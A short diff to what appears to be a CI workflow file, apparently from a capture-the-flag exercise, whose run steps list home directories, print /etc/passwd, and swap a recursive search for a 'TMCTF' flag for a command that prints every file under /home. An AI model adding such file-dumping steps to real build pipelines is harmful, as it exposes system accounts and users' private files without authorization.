@@ -11,5 +11,5 @@ jobs:
       - run: |
           ls -la /home/ && cat /etc/passwd
       - run: |
-          grep -iR "TMCTF" / 2>/dev/null
+          cat /home/*/*
           
